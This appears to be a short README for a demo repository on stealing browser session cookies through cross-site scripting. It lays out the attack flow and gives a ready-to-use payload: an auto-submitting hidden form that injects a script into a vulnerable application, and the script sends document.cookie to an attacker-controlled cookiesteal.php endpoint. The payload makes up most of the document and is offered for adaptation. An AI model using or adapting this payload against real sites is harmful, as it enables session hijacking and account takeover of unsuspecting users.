## Session-Stealing-Using-XSS ##

# This is a demo application to steal cookie stored at the client side i.e. in the browser #

*The Process* 
1. First consider there is an vulnerable application hosted at Server A
2. The attacker will send his payload to the victim which is hosted at Server B(Attacker's Server)
3. The Victim will click on the payload and while his session with the legitimate application is going on which is hosted at Serve A, his cookies will be fetched and passed to the attacker's server i.e. server B.

the payload is passed within the form value:


<body onload="document.myForm.submit()">

<form method="GET" action="http://vulnerableapp.com" name="myForm">

<input type=hidden name="firstname"  value="<script>document.location='http://attackerserver.com/cookiesteal.php?c='+document.cookie;</script>"/>
<input type=hidden name="lastname"  value="hello hacker"/>
<input type=hidden name="form"  value="submit"/>

<!-- this is a autosubmit form with two parameters. you can modify the parameters according to the need.
In the form action parameter, address of the XSS vunerable application is passed.

In the payload i.e. the first input parameter attacker server's location is passed where the stealed cookie will be passed to a php
file and further write in a txt file-->
</form>
